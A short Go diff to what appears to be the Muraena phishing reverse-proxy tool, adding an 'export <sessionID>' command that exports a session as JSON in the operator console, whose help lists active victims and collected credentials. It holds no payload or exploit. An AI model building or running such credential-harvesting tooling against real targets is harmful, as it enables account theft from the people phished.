@@ -50,6 +50,10 @@ func Prompt(s *Session) {
 			s.showTracking(result)
 		}
 
+		if strings.HasPrefix(result, "export ") {
+			s.showTracking(result)
+		}
+
 	}
 }
 
@@ -63,18 +67,20 @@ func validate(input string) error {
 		return nil
 	}
 
+	if strings.HasPrefix(input, "export ") {
+		return nil
+	}
 	return errors.New(InvalidCommand)
 }
 
 func help() {
 	log.Raw("**************************************************************************")
-	log.Raw("* NOTE: This feature is not fully implemented yet. ")
-	log.Raw("*       Follow evolutions on https://github.com/muraenateam/muraena/issues/5")
 	log.Raw("* Options")
 	log.Raw("* - help: %s", tui.Bold("Prints this help"))
 	log.Raw("* - exit: %s", tui.Bold("Exit from "+core.Name))
 	log.Raw("* - victims: %s", tui.Bold("Show active victims"))
 	log.Raw("* - credentials: %s", tui.Bold("Show collected credentials"))
+	log.Raw("* - export <sessionID>: %s", tui.Bold("Export a session as JSON"))
 	log.Raw("**************************************************************************")
 
 }
